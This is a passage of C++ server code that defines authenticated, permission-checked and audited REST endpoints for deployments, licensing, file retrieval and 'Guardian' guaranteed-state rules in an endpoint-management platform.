        sink.Post(R"(/api/v1/software-deployments/([a-f0-9]+)/rollback)",
                  [auth_fn, perm_fn, audit_fn, sw_deploy_store](const httplib::Request& req,
                                                                httplib::Response& res) {
                      auto session = auth_fn(req, res);
                      if (!session)
                          return;
                      if (!perm_fn(req, res, "SoftwareDeployment", "Execute"))
                          return;
                      auto id = req.matches[1].str();
                      if (sw_deploy_store->rollback_deployment(id)) {
                          audit_fn(req, "software_deployment.rollback", "success",
                                   "SoftwareDeployment", id, "");
                          res.set_content(ok_json(JObj().add("rolled_back", true).str()),
                                          "application/json");
                      } else {
                          res.status = 400;
                          res.set_content(error_json("cannot rollback deployment"),
                                          "application/json");
                      }
                  });

        sink.Post(R"(/api/v1/software-deployments/([a-f0-9]+)/cancel)",
                  [auth_fn, perm_fn, audit_fn, sw_deploy_store](const httplib::Request& req,
                                                                httplib::Response& res) {
                      auto session = auth_fn(req, res);
                      if (!session)
                          return;
                      if (!perm_fn(req, res, "SoftwareDeployment", "Execute"))
                          return;
                      auto id = req.matches[1].str();
                      if (sw_deploy_store->cancel_deployment(id)) {
                          audit_fn(req, "software_deployment.cancel", "success",
                                   "SoftwareDeployment", id, "");
                          res.set_content(ok_json(JObj().add("cancelled", true).str()),
                                          "application/json");
                      } else {
                          res.status = 400;
                          res.set_content(error_json("cannot cancel deployment"),
                                          "application/json");
                      }
                  });
    }

    // ── License Management (capability 22.3) ──────────────────────────────

    if (license_store) {
        sink.Get("/api/v1/license", [perm_fn, license_store](const httplib::Request& req,
                                                             httplib::Response& res) {
            if (!perm_fn(req, res, "License", "Read"))
                return;
            auto lic = license_store->get_active_license();
            if (!lic) {
                res.set_content(ok_json(JObj().add("status", "none").str()), "application/json");
                return;
            }
            auto data = JObj()
                            .add("id", lic->id)
                            .add("organization", lic->organization)
                            .add("seat_count", lic->seat_count)
                            .add("seats_used", lic->seats_used)
                            .add("issued_at", lic->issued_at)
                            .add("expires_at", lic->expires_at)
                            .add("edition", lic->edition)
                            .add("status", lic->status)
                            .add("days_remaining", license_store->days_remaining())
                            .str();
            res.set_content(ok_json(data), "application/json");
        });

        sink.Post("/api/v1/license", [auth_fn, perm_fn, audit_fn, license_store](
                                         const httplib::Request& req, httplib::Response& res) {
            auto session = auth_fn(req, res);
            if (!session)
                return;
            if (!perm_fn(req, res, "License", "Write"))
                return;
            auto body = nlohmann::json::parse(req.body, nullptr, false);
            if (body.is_discarded()) {
                res.status = 400;
                res.set_content(error_json("invalid JSON"), "application/json");
                return;
            }
            License lic;
            lic.organization = body.value("organization", "");
            lic.seat_count = body.value("seat_count", int64_t{0});
            lic.edition = body.value("edition", "community");
            lic.expires_at = body.value("expires_at", int64_t{0});
            lic.features_json = body.value("features_json", "[]");
            auto key = body.value("license_key", "");

            auto result = license_store->activate_license(lic, key);
            if (!result) {
                res.status = 400;
                res.set_content(error_json(result.error()), "application/json");
                return;
            }
            audit_fn(req, "license.activate", "success", "License", *result, lic.organization);
            res.status = 201;
            res.set_content(ok_json(JObj().add("id", *result).str()), "application/json");
        });

        sink.Delete(R"(/api/v1/license/([a-f0-9]+))", [auth_fn, perm_fn, audit_fn,
                                                       license_store](const httplib::Request& req,
                                                                      httplib::Response& res) {
            auto session = auth_fn(req, res);
            if (!session)
                return;
            if (!perm_fn(req, res, "License", "Write"))
                return;
            auto id = req.matches[1].str();
            if (license_store->remove_license(id)) {
                audit_fn(req, "license.remove", "success", "License", id, "");
                res.set_content(ok_json(JObj().add("removed", true).str()), "application/json");
            } else {
                res.status = 404;
                res.set_content(error_json("license not found"), "application/json");
            }
        });

        sink.Get("/api/v1/license/alerts",
                 [perm_fn, license_store](const httplib::Request& req, httplib::Response& res) {
                     if (!perm_fn(req, res, "License", "Read"))
                         return;
                     bool unack = req.has_param("unacknowledged");
                     auto alerts = license_store->list_alerts(unack);
                     JArr arr;
                     for (const auto& a : alerts) {
                         arr.add(JObj()
                                     .add("id", a.id)
                                     .add("alert_type", a.alert_type)
                                     .add("message", a.message)
                                     .add("triggered_at", a.triggered_at)
                                     .add("acknowledged", a.acknowledged));
                     }
                     res.set_content(list_json(arr.str(), static_cast<int64_t>(alerts.size())),
                                     "application/json");
                 });
    }

    // ── Topology (capability 22.2) ─ REST endpoint ────────────────────────

    sink.Get("/api/v1/topology", [perm_fn](const httplib::Request& req, httplib::Response& res) {
        if (!perm_fn(req, res, "Infrastructure", "Read"))
            return;
        // Topology data is assembled from in-memory agent registry in server.cpp
        // fragment routes. The REST endpoint returns a placeholder for external callers.
        auto data =
            JObj()
                .add("message", "Use /frag/topology-data for HTMX or query individual stores")
                .str();
        res.set_content(ok_json(data), "application/json");
    });

    // ── Statistics (capability 22.6) ─ REST endpoint ──────────────────────

    sink.Get("/api/v1/statistics",
             [perm_fn, execution_tracker](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "Infrastructure", "Read"))
                     return;
                 auto fleet = execution_tracker->get_fleet_summary();
                 auto data = JObj()
                                 .raw("executions",
                                      JObj()
                                          .add("total", fleet.total_executions)
                                          .add("today", fleet.executions_today)
                                          .add("success_rate", fleet.overall_success_rate)
                                          .add("avg_duration_seconds", fleet.avg_duration_seconds)
                                          .str())
                                 .add("active_agents", fleet.active_agents)
                                 .str();
                 res.set_content(ok_json(data), "application/json");
             });

    // ── File Retrieval (capability 10.13) ────────────────────────────────
    // Receives files uploaded by the content_dist plugin's upload_file action.
    sink.Post("/api/v1/file-retrieval",
              [auth_fn, perm_fn, audit_fn](const httplib::Request& req, httplib::Response& res) {
                  if (!perm_fn(req, res, "FileRetrieval", "Write"))
                      return;

                  // Extract form fields from the request body (JSON)
                  auto body = nlohmann::json::parse(req.body, nullptr, false);
                  if (body.is_discarded() || !body.contains("agent_id")) {
                      res.status = 400;
                      res.set_content(error_json("invalid request body"), "application/json");
                      return;
                  }
                  auto agent_id = body.value("agent_id", "");
                  auto original_path = body.value("original_path", "");
                  auto sha256 = body.value("sha256", "");
                  auto file_size = body.value("size", int64_t{0});

                  // Store the uploaded file (implementation: write to a configurable
                  // retrieval directory, keyed by agent_id and timestamp)
                  spdlog::info("FileRetrieval: received {} bytes from agent={}, path={}", file_size,
                               agent_id, original_path);

                  audit_fn(req, "file_retrieval.upload", "success", "FileRetrieval", agent_id,
                           "path=" + original_path + ", size=" + std::to_string(file_size));

                  auto data = JObj()
                                  .add("status", "received")
                                  .add("bytes", file_size)
                                  .add("agent_id", agent_id)
                                  .add("sha256", sha256)
                                  .str();
                  res.set_content(ok_json(data), "application/json");
              });

    // ── Guardian / Guaranteed State (/api/v1/guaranteed-state) ────────────
    // PR 2 of the Guardian Windows-first rollout. Endpoints follow design
    // doc §9.2. RBAC securable type is "GuaranteedState" with operations
    // Read/Write/Delete/Push (Push is a new op seeded by rbac_store).
    //
    // Re-parsing YAML for the denormalised columns is intentionally NOT
    // done here — yaml-cpp is not a server-side dep. Callers pass severity
    // / os_target / scope_expr alongside yaml_source in the JSON body
    // (matches how `instruction_store` ingests YAML from the dashboard).

    auto iso_now = []() {
        auto now = std::chrono::system_clock::now();
        std::time_t t = std::chrono::system_clock::to_time_t(now);
        std::tm tm{};
#if defined(_WIN32)
        gmtime_s(&tm, &t);
#else
        gmtime_r(&t, &tm);
#endif
        char buf[32];
        std::strftime(buf, sizeof(buf), "%Y-%m-%dT%H:%M:%SZ", &tm);
        return std::string(buf);
    };

    auto rule_to_jobj = [](const GuaranteedStateRuleRow& r) {
        JObj o;
        o.add("rule_id", r.rule_id)
            .add("name", r.name)
            .add("yaml_source", r.yaml_source)
            .add("spec_json", r.spec_json)
            .add("version", static_cast<int64_t>(r.version))
            .add("enabled", r.enabled)
            .add("enforcement_mode", r.enforcement_mode)
            .add("severity", r.severity)
            .add("os_target", r.os_target)
            .add("scope_expr", r.scope_expr)
            .add("created_at", r.created_at)
            .add("updated_at", r.updated_at)
            .add("created_by", r.created_by)
            .add("updated_by", r.updated_by);
        return o;
    };

    sink.Get("/api/v1/guaranteed-state/rules",
             [perm_fn, guaranteed_state_store, rule_to_jobj](const httplib::Request& req,
                                                             httplib::Response& res) {
                 if (!perm_fn(req, res, "GuaranteedState", "Read"))
                     return;
                 if (!guaranteed_state_store) {
                     res.status = 503;
                     res.set_content(error_json("service unavailable", 503), "application/json");
                     return;
                 }
                 auto rows = guaranteed_state_store->list_rules();
                 JArr arr;
                 for (const auto& r : rows)
                     arr.add(rule_to_jobj(r));
                 res.set_content(list_json(arr.str(), static_cast<int64_t>(rows.size())),
                                 "application/json");
             });

    // Schema-registry discovery surface (contract G9 / decision 3): the static
    // catalog of Guard spark/assertion/remediation types + per-type JSON Schemas
    // (discriminated subschemas for value-dependent formats). Agentic-first
    // (A1/A2) — drives the dashboard's create/edit form (C3c) and any agentic
    // author. Cacheable: a content-derived ETag lets a client fetch-once and
    // revalidate cheaply (NFR-kind). Does NOT require the store — the catalog is
    // compiled-in, so it answers even when the rules DB is unavailable.
    sink.Get("/api/v1/guaranteed-state/schemas",
             [perm_fn](const httplib::Request& req, httplib::Response& res) {
                 if (!perm_fn(req, res, "GuaranteedState", "Read"))
                     return;
                 const auto& catalog = guardian::guardian_schema_catalog();
                 res.set_header("ETag", catalog.etag);
                 res.set_header("Cache-Control", "public, max-age=300");
                 if (req.get_header_value("If-None-Match") == catalog.etag) {
                     res.status = 304; // not modified — client's cached copy is current
                     return;
                 }
                 res.set_content(catalog.json, "application/json");
             });

    sink.Post("/api/v1/guaranteed-state/rules", [auth_fn, perm_fn, audit_fn, step_up_fn,
                                                 guaranteed_state_store,
                                                 iso_now](const httplib::Request& req,
                                                          httplib::Response& res) {
        // PR2 governance Gate 4 consistency-B2: order is
        // auth_fn → perm_fn → step_up_fn → store-null guard. Resolving
        // the session up front means a single map lookup and avoids the
        // re-resolve race that the prior order opened up. (The
        // token/session handlers run perm_fn before auth_fn; both
        // orderings are safe because step_up_fn always runs last, after
        // auth_fn has populated `session` — PR #1199 review LOW.)
        auto session = auth_fn(req, res);
        if (!session)
            return;
        if (!perm_fn(req, res, "GuaranteedState", "Write"))
            return;
        if (step_up_fn && !step_up_fn(req, res, *session, "POST /api/v1/guaranteed-state/rules"))
            return;
        // Authoring errors return the A4 structured envelope (contract decision 3)
        // so an agentic author self-corrects; the whole create handler speaks A4
        // uniformly (not a mix of A4 + plain error_json across sibling branches).
        const auto cid = detail::make_correlation_id();
        if (!guaranteed_state_store) {
            res.status = 503;
            res.set_content(detail::error_json_a4(503, "service unavailable", cid),
                            "application/json");
            return;
        }
        auto body = nlohmann::json::parse(req.body, nullptr, false);
        if (body.is_discarded() || !body.is_object()) {
            res.status = 400;
            res.set_content(detail::error_json_a4(400, "invalid JSON", cid,
                                                  "send a JSON object request body"),
                            "application/json");
            return;
        }
        GuaranteedStateRuleRow row;
        row.rule_id = body.value("rule_id", "");
        row.name = body.value("name", "");
        row.version = body.value("version", int64_t{1});
        row.enabled = body.value("enabled", true);
        row.enforcement_mode = body.value("enforcement_mode", std::string{"enforce"});
        row.severity = body.value("severity", std::string{"medium"});
        row.os_target = body.value("os_target", std::string{""});
        row.scope_expr = body.value("scope_expr", body.value("scope", std::string{""}));

        // enforcement_mode decides whether the agent WRITES to the endpoint, so
        // reject anything but enforce|audit. An empty/garbage value would render
        // as ENFORCING in the dashboard while the agent silently arms audit
        // (governance C1/B2). Disabling a guard is the `enabled` flag, not a mode.
        if (row.enforcement_mode != "enforce" && row.enforcement_mode != "audit") {
            res.status = 400;
            res.set_content(detail::error_json_a4(400, "enforcement_mode must be 'enforce' or 'audit'",
                                                  cid, "set enforcement_mode to 'enforce' or 'audit'"),
                            "application/json");
            // Audit the reject (sibling-parity with the update handler + the
            // invalid-JSON branch — leave a SIEM trail for a malformed/probe body).
            audit_fn(req, "guaranteed_state.rule.create", "denied", "GuaranteedState", row.rule_id,
                     "invalid enforcement_mode");
            return;
        }

        // Guardian Guards are authored STRUCTURED (contract decisions 1-3): typed
        // spark/assertion/remediation blocks, each {type, map params}. derive_rule_spec
        // builds the authoritative canonical spec_json + a human-readable yaml_source
        // rendering and validates the remediation.params resilience policy (C3b). A
        // legacy yaml_source-only body is still accepted (structured=false; stored but
        // not agent-enforceable) so pre-structured callers and tests keep working.
        auto spec = guardian::derive_rule_spec(body, row.name, row.version, row.enabled,
                                               row.enforcement_mode);
        if (spec.error) {
            res.status = 400;
            res.set_content(
                detail::error_json_a4(400, spec.error->message, cid, spec.error->remediation),
                "application/json");
            audit_fn(req, "guaranteed_state.rule.create", "denied", "GuaranteedState", row.rule_id,
                     spec.error->message);
            return;
        }
        if (spec.structured) {
            row.spec_json = std::move(spec.spec_json);
            row.yaml_source = std::move(spec.yaml_source);
        } else {
            // Legacy path: yaml_source supplied directly, no structured spec.
            row.yaml_source = body.value("yaml_source", std::string{});
        }

        if (row.rule_id.empty() || row.name.empty() ||
            (!spec.structured && row.yaml_source.empty())) {
            res.status = 400;
            res.set_content(
                detail::error_json_a4(
                    400,
                    "rule_id and name are required, plus either a structured "
                    "spark+assertion or a yaml_source",
                    cid, "provide rule_id, name and a spark+assertion (or yaml_source)"),
                "application/json");
            return;
        }
        row.created_by = session->username;
        row.updated_by = session->username;
        row.created_at = iso_now();
        row.updated_at = row.created_at;

        auto result = guaranteed_state_store->create_rule(row);
        if (!result) {
            if (is_conflict_error(result.error())) {
                res.status = 409;
                res.set_content(detail::error_json_a4(409, strip_conflict_prefix(result.error()), cid,
                                                      "choose a unique rule_id and name"),
                                "application/json");
            } else {
                res.status = 400;
                res.set_content(detail::error_json_a4(400, result.error(), cid), "application/json");
            }
            audit_fn(req, "guaranteed_state.rule.create", "denied", "GuaranteedState", row.rule_id,
                     result.error());
            return;
        }
        audit_fn(req, "guaranteed_state.rule.create", "success", "GuaranteedState", row.rule_id,
                 row.name);
        res.status = 201;
        res.set_content(ok_json(JObj().add("rule_id", row.rule_id).str()), "application/json");
    });

    sink.Get(R"(/api/v1/guaranteed-state/rules/([A-Za-z0-9._\-]+))",
             [perm_fn, guaranteed_state_store, rule_to_jobj](const httplib::Request& req,
                                                             httplib::Response& res) {
                 if (!perm_fn(req, res, "GuaranteedState", "Read"))
                     return;
                 if (!guaranteed_state_store) {
                     res.status = 503;
                     res.set_content(error_json("service unavailable", 503), "application/json");
                     return;
                 }
                 auto id = req.matches[1].str();
                 auto row = guaranteed_state_store->get_rule(id);
                 if (!row) {
                     res.status = 404;
                     res.set_content(error_json("rule not found"), "application/json");
                     return;
                 }
                 res.set_content(ok_json(rule_to_jobj(*row).str()), "application/json");
             });

    sink.Put(R"(/api/v1/guaranteed-state/rules/([A-Za-z0-9._\-]+))",
             [auth_fn, perm_fn, audit_fn, step_up_fn, guaranteed_state_store,
              iso_now](const httplib::Request& req, httplib::Response& res) {
                 auto session = auth_fn(req, res);
                 if (!session)
                     return;
                 if (!perm_fn(req, res, "GuaranteedState", "Write"))
                     return;
                 if (step_up_fn &&
                     !step_up_fn(req, res, *session,
                                 "PUT /api/v1/guaranteed-state/rules/{id}"))
                     return;
                 // A4 envelope across the whole update handler (contract decision 3),
                 // uniform with the create handler.
                 const auto cid = detail::make_correlation_id();
                 if (!guaranteed_state_store) {
                     res.status = 503;
                     res.set_content(detail::error_json_a4(503, "service unavailable", cid),
                                     "application/json");
                     return;
                 }
                 auto id = req.matches[1].str();
                 auto existing = guaranteed_state_store->get_rule(id);
                 if (!existing) {
                     res.status = 404;
                     res.set_content(detail::error_json_a4(404, "rule not found", cid),
                                     "application/json");
                     return;
                 }
                 auto body = nlohmann::json::parse(req.body, nullptr, false);
                 if (body.is_discarded() || !body.is_object()) {
                     res.status = 400;
                     res.set_content(detail::error_json_a4(400, "invalid JSON", cid,
                                                           "send a JSON object request body"),
                                     "application/json");
                     // Mirror the /push handler's invalid-body audit (BL-6): a
                     // mutating REST path that rejects a malformed body should
                     // leave a denied audit trail so SIEM sees the probe/fuzz
                     // attempt. Asymmetric audit coverage across sibling branches
                     // was flagged as UP-R1 in the Guardian PR 2 governance re-run.
                     audit_fn(req, "guaranteed_state.rule.update", "denied", "GuaranteedState", id,
                              "invalid JSON body");
                     return;
                 }
                 auto updated = *existing;
                 // Use body.value<T>(k, default) rather than body["k"].get<T>()
                 // so a type-mismatched JSON field (e.g. {"enabled": "yes"})
                 // falls back to the existing value rather than throwing
                 // nlohmann::json::type_error. nlohmann throws from get<T>() on
                 // mismatch; without a server-wide set_exception_handler on
                 // web_server_ (none installed), httplib's default path returns
                 // HTTP 500 with an empty body. That converts a client-error
                 // request-shape mistake into a server-error alertable event.
                 // Mirrors the POST handler's body.value(...) pattern.
                 updated.name = body.value("name", updated.name);
                 updated.enabled = body.value("enabled", updated.enabled);
                 // Mode (Watch/Enforce) is IMMUTABLE after creation — a different
                 // posture is a different Guard (docs/guardian-baseline-model.md). A
                 // full-object PUT may echo the current mode, but changing it is a
                 // 400, not a silent flip: the operator must author a new Guard.
                 if (body.contains("enforcement_mode") &&
                     body.value("enforcement_mode", existing->enforcement_mode) !=
                         existing->enforcement_mode) {
                     res.status = 400;
                     res.set_content(
                         detail::error_json_a4(
                             400, "enforcement_mode is immutable — create a new Guard for a "
                                  "different posture (Watch vs Enforce)",
                             cid, "create a new Guard instead of changing its mode"),
                         "application/json");
                     audit_fn(req, "guaranteed_state.rule.update", "denied", "GuaranteedState", id,
                              "attempt to change immutable enforcement_mode");
                     return;
                 }
                 updated.enforcement_mode = existing->enforcement_mode;  // unchanged
                 updated.severity = body.value("severity", updated.severity);
                 updated.os_target = body.value("os_target", updated.os_target);
                 updated.scope_expr = body.value("scope_expr", updated.scope_expr);
                 updated.version = existing->version + 1;

                 // A structured body re-authors the Guard (contract §8): re-derive the
                 // canonical spec + yaml_source and re-validate the resilience policy
                 // (C3b) rather than the pre-C3b behaviour of silently dropping the
                 // blocks on a 200. A metadata-only body (no spark/assertion/remediation)
                 // keeps the existing spec_json and just applies any yaml_source
                 // override. derive_rule_spec sees the bumped version so the embedded
                 // spec.version matches the row.
                 auto spec = guardian::derive_rule_spec(body, updated.name, updated.version,
                                                        updated.enabled, updated.enforcement_mode);
                 if (spec.error) {
                     res.status = 400;
                     res.set_content(
                         detail::error_json_a4(400, spec.error->message, cid, spec.error->remediation),
                         "application/json");
                     audit_fn(req, "guaranteed_state.rule.update", "denied", "GuaranteedState", id,
                              spec.error->message);
                     return;
                 }
                 if (spec.structured) {
                     updated.spec_json = std::move(spec.spec_json);
                     updated.yaml_source = std::move(spec.yaml_source);
                 } else {
                     updated.yaml_source = body.value("yaml_source", updated.yaml_source);
                     // Metadata-only update keeps the existing spec_json, so
                     // derive_rule_spec's assertion validator did NOT run. If this
                     // update flips the rule into enforce mode, re-check the STORED
                     // assertion against the dangerous-key denylist — otherwise an
                     // audit guard on a protected key can be promoted to a
                     // SYSTEM-write past the H1 gate (contract §6).
                     if (updated.enforcement_mode == "enforce") {
                         if (std::string why =
                                 guardian::dangerous_enforce_in_spec(updated.spec_json);
                             !why.empty()) {
                             res.status = 400;
                             res.set_content(
                                 detail::error_json_a4(
                                     400, "enforce mode not permitted: this guard targets " + why,
                                     cid,
                                     "keep this guard in audit mode, or re-author it against a "
                                     "non-protected target"),
                                 "application/json");
                             audit_fn(req, "guaranteed_state.rule.update", "denied",
                                      "GuaranteedState", id, "enforce on denylisted target");
                             return;
                         }
                     }
                 }

                 updated.updated_at = iso_now();
                 updated.updated_by = session->username;

                 auto result = guaranteed_state_store->update_rule(updated);
                 if (!result) {
                     if (is_conflict_error(result.error())) {
                         res.status = 409;
                         res.set_content(detail::error_json_a4(409, strip_conflict_prefix(result.error()),
                                                               cid, "choose a unique name"),
                                         "application/json");
                     } else {
                         res.status = 400;
                         res.set_content(detail::error_json_a4(400, result.error(), cid),
                                         "application/json");
                     }
                     audit_fn(req, "guaranteed_state.rule.update", "denied", "GuaranteedState", id,
                              result.error());
                     return;
                 }
                 audit_fn(req, "guaranteed_state.rule.update", "success", "GuaranteedState", id,
                          updated.name);
                 res.set_content(ok_json(JObj()
                                             .add("updated", true)
                                             .add("version", static_cast<int64_t>(updated.version))
                                             .str()),
                                 "application/json");
             });

    sink.Delete(R"(/api/v1/guaranteed-state/rules/([A-Za-z0-9._\-]+))",
                [auth_fn, perm_fn, audit_fn, step_up_fn,
                 guaranteed_state_store](const httplib::Request& req,
                                         httplib::Response& res) {
                    // PR2 Gate 4 consistency-B1: Guardian rule DELETE is
                    // equally destructive to UPDATE — gating both keeps
                    // a hijacked session from removing auto-remediation
                    // policy.
                    auto session = auth_fn(req, res);
                    if (!session)
                        return;
                    if (!perm_fn(req, res, "GuaranteedState", "Delete"))
                        return;
                    if (step_up_fn &&
                        !step_up_fn(req, res, *session,
                                    "DELETE /api/v1/guaranteed-state/rules/{id}"))
                        return;
                    if (!guaranteed_state_store) {
                        res.status = 503;
                        res.set_content(error_json("service unavailable", 503), "application/json");
                        return;
                    }
                    auto id = req.matches[1].str();
                    auto result = guaranteed_state_store->delete_rule(id);
                    if (!result) {
                        res.status = 404;
                        res.set_content(error_json(result.error()), "application/json");
                        audit_fn(req, "guaranteed_state.rule.delete", "denied", "GuaranteedState",
                                 id, result.error());
                        return;
                    }
                    audit_fn(req, "guaranteed_state.rule.delete", "success", "GuaranteedState", id,
                             "");
                    res.set_content(ok_json(JObj().add("deleted", true).str()), "application/json");
                });

    // POST /push — fan-out is wired in PR 3 (agent-side dispatch + scope
    // expansion). PR 2 acks the request and audits the operator action so
    // dashboards and audit-trail tooling can be exercised end-to-end now.
    sink.Post("/api/v1/guaranteed-state/push", [auth_fn, perm_fn, audit_fn, step_up_fn,
                                                guaranteed_state_store,
                                                guardian_push_fn](const httplib::Request& req,
                                                                  httplib::Response& res) {
        auto session = auth_fn(req, res);
        if (!session)
            return;
        if (!perm_fn(req, res, "GuaranteedState", "Push"))
            return;
        if (step_up_fn && !step_up_fn(req, res, *session, "POST /api/v1/guaranteed-state/push"))
            return;
        if (!guaranteed_state_store) {
            res.status = 503;
            res.set_content(error_json("service unavailable", 503), "application/json");
            return;
        }
        auto body = nlohmann::json::parse(req.body, nullptr, false);
        if (body.is_discarded() || (!body.is_null() && !body.is_object())) {
            res.status = 400;
            res.set_content(error_json("invalid JSON"), "application/json");
            audit_fn(req, "guaranteed_state.push", "denied", "GuaranteedState", "",
                     "invalid JSON body");
            return;
        }
        if (body.is_null())
            body = nlohmann::json::object();
        std::string scope = body.value("scope", std::string{""});
        bool full_sync = body.value("full_sync", false);
        const auto rule_count = guaranteed_state_store->rule_count();
        // Sanitize scope before embedding in the audit detail: operators
        // with GuaranteedState:Push can otherwise post a scope containing
        // raw quotes, CR/LF, NULs, or pipes, which appear verbatim in the
        // detail string and corrupt SIEM parsers that tokenise on quoted
        // strings or split on newlines (log-injection, SOC 2 audit-trail
        // integrity). Dropping control bytes and backslash-escaping `"`
        // and `\` preserves every printable scope DSL expression while
        // neutering the injection vector. audit_store stores the string
        // as an opaque column, so the sanitization is defensive at the
        // SIEM layer only — but that is the layer SOC 2 Workstream F
        // evidence is reconstructed from.
        auto sanitize_audit_string = [](const std::string& s) {
            std::string out;
            out.reserve(s.size());
            for (char c : s) {
                if (c == '"' || c == '\\') {
                    out += '\\';
                    out += c;
                } else if (static_cast<unsigned char>(c) < 0x20 ||
                           static_cast<unsigned char>(c) == 0x7F) {
                    // Drop control bytes (CR/LF/NUL/TAB and all C0/DEL).
                    // Keeping them as escapes would still let an attacker
                    // embed "\\n\\n" to visually split a SIEM view; better
                    // to erase. Non-ASCII UTF-8 (>= 0x80) is preserved.
                } else {
                    out += c;
                }
            }
            return out;
        };
        // Step 3 fan-out: resolve scope → in-scope agents, build the GuaranteedStatePush
        // from the store, deliver via the agent dispatch path. The callback is injected
        // from server.cpp (registry + scope engine live there). A null callback means
        // dispatch isn't wired (tests) — degrade to ack-only with agents=0. target_id is
        // left empty: the scope is a fleet-level selector, not an entity id, so it goes
        // in `detail` to preserve the SIEM join semantics.
        int pushed = 0;
        if (guardian_push_fn) {
            pushed = guardian_push_fn(scope, full_sync);
            if (pushed < 0) {
                res.status = 400;
                res.set_content(error_json("invalid scope expression"), "application/json");
                audit_fn(req, "guaranteed_state.push", "denied", "GuaranteedState", "",
                         "invalid scope=\"" + sanitize_audit_string(scope) + "\"");
                return;
            }
        }
        audit_fn(req, "guaranteed_state.push", "success", "GuaranteedState", "",
                 "rules=" + std::to_string(rule_count) + " full_sync=" +
                     (full_sync ? "true" : "false") + " scope=\"" + sanitize_audit_string(scope) +
                     "\" agents=" + std::to_string(pushed));
        res.status = 202;
        res.set_content(ok_json(JObj()
                                    .add("queued", true)
                                    .add("rules", static_cast<int64_t>(rule_count))
                                    .add("agents", static_cast<int64_t>(pushed))
                                    .add("scope", scope)
                                    .str()),
                        "application/json");
    });

    // GET /events — query events with optional filters. Mirrors
    // `audit_store` query semantics. Caps `limit` at 1000 at the REST
    // boundary; the store enforces a hard upper bound at kMaxEventsLimit.
    sink.Get("/api/v1/guaranteed-state/events", [perm_fn, audit_fn, guaranteed_state_store](
                                                    const httplib::Request& req,
                                                    httplib::Response& res) {
        if (!perm_fn(req, res, "GuaranteedState", "Read"))
            return;
        if (!guaranteed_state_store) {
            res.status = 503;
            res.set_content(error_json("service unavailable", 503), "application/json");
            return;
        }
        GuaranteedStateEventQuery q;
        q.rule_id = req.has_param("rule_id") ? req.get_param_value("rule_id") : "";
        q.agent_id = req.has_param("agent_id") ? req.get_param_value("agent_id") : "";
        q.severity = req.has_param("severity") ? req.get_param_value("severity") : "";
        // Behavioral-PII access audit (governance compliance-F1): an agent-scoped
        // query returns that device's signal history incl. detail_json (which apps
        // a person runs) — the same behavioral data the dashboard per-device view
        // audits as dex.device.view. Emit the SAME verb so a SIEM filter catches
        // both surfaces. A query with NO agent_id filter is a bulk operational
        // query (not individual-identifying) and is deliberately not audited here.
        // FAIL-CLOSED (governance #1549 consistency-B1): an agent-scoped query serves
        // individual-identifying behavioral PII, so refuse to serve when the evidence
        // row is KNOWN to have failed to persist — parity with GET /dex/devices/{id}.
        // The shared #1647 helper sets Sec-Audit-Failed + adds the catch-arm log
        // (a bad_alloc-class throw from audit_fn was previously silent here); a null
        // audit_fn (audit-off) returns true and serves, per the AuditFn contract.
        if (!q.agent_id.empty() &&
            !detail::emit_behavioral_audit(
                audit_fn, req, res, "dex.device.view", "success", "Agent", q.agent_id,
                "DEX per-device events via REST /api/v1/guaranteed-state/events")) {
            // A4 envelope (correlation_id + retry_after_ms) for parity with the
            // /dex/devices/{id} + baseline siblings (#1651 review K2); Sec-Audit-Failed
            // is already set by emit_behavioral_audit. The failure is transient — retry.
            const auto cid = detail::make_correlation_id();
            res.status = 503;
            res.set_header("X-Correlation-Id", cid);
            res.set_content(detail::error_json_a4(503,
                                                  "audit subsystem unavailable; refusing to serve "
                                                  "device data without durable evidence",
                                                  cid, 5000, "retry after the audit subsystem "
                                                             "recovers"),
                            "application/json");
            spdlog::warn("dex.device.view (events) audit fail-closed (503) agent_id={} cid={}",
                         q.agent_id, cid);
            return;
        }
        if (req.has_param("limit")) {
            int v = 0;
            auto s = req.get_param_value("limit");
            [[maybe_unused]] auto [_, ec] = std::from_chars(s.data(), s.data() + s.size(), v);
            if (ec != std::errc{} || v < 0) {
                res.status = 400;
                res.set_content(error_json("invalid limit"), "application/json");
                return;
            }
            q.limit = std::min(v, 1000);
        }
        if (req.has_param("offset")) {
            int v = 0;
            auto s = req.get_param_value("offset");
            [[maybe_unused]] auto [_, ec] = std::from_chars(s.data(), s.data() + s.size(), v);
            if (ec != std::errc{} || v < 0) {
                res.status = 400;
                res.set_content(error_json("invalid offset"), "application/json");
                return;
            }
            q.offset = v;
        }
        auto rows = guaranteed_state_store->query_events(q);
        JArr arr;
        for (const auto& e : rows) {
            arr.add(
                JObj()
                    .add("event_id", e.event_id)
                    .add("rule_id", e.rule_id)
                    .add("agent_id", e.agent_id)
                    .add("event_type", e.event_type)
                    .add("severity", e.severity)
                    .add("guard_type", e.guard_type)
                    .add("guard_category", e.guard_category)
                    .add("detected_value", e.detected_value)
                    .add("expected_value", e.expected_value)
                    .add("detail_json", e.detail_json)
                    .add("remediation_action", e.remediation_action)
                    .add("remediation_success", e.remediation_success)
                    .add("detection_latency_us", static_cast<int64_t>(e.detection_latency_us))
                    .add("remediation_latency_us", static_cast<int64_t>(e.remediation_latency_us))
                    .add("timestamp", e.timestamp));
        }
        res.set_content(
            list_json(arr.str(), static_cast<int64_t>(rows.size()), static_cast<int64_t>(q.offset)),
            "application/json");
    });

    // ── DEX read-model aggregation surface (/api/v1/dex/*) ────────────────────
    //
    // Agentic-first parity (governance ar-S1): the DEX dashboard's catalogue
    // rollup, per-signal drill-down and per-OS coverage were dashboard-only
    // HTMX fragments — an agentic worker had no machine-readable equivalent.
    // These three GETs expose the SAME store aggregations the fragments render,
    // JSON-shaped, gated on the same GuaranteedState:Read securable, and resolve
    // the `window` token through the shared dex_window_to_days/dex_iso_since
    // helpers so REST and the dashboard can never drift on the window vocabulary.
    //
    // Audit boundary mirrors GET /guaranteed-state/events exactly: the catalogue
    // rollup and per-OS scope are fleet aggregates (not individual-identifying)
    // and are NOT audited; the per-signal drill-down returns a most-affected
    // DEVICES list (agent_ids — behavioral, individual-identifying) and emits the
    // same dex.signal.view verb the /fragments/dex/catalogue/signal route does.

    // GET /dex/signals — whole-catalogue rollup (every obs_type in the window,
    // with event count + blast radius). Aggregate; not audited.
    sink.Get("/api/v1/dex/signals", [perm_fn, guaranteed_state_store](const httplib::Request& req,
                                                                      httplib::Response& res) {
        if (!perm_fn(req, res, "GuaranteedState", "Read"))
            return;
        if (!guaranteed_state_store) {
            res.status = 503;
            res.set_content(error_json("service unavailable", 503), "application/json");
            return;
        }
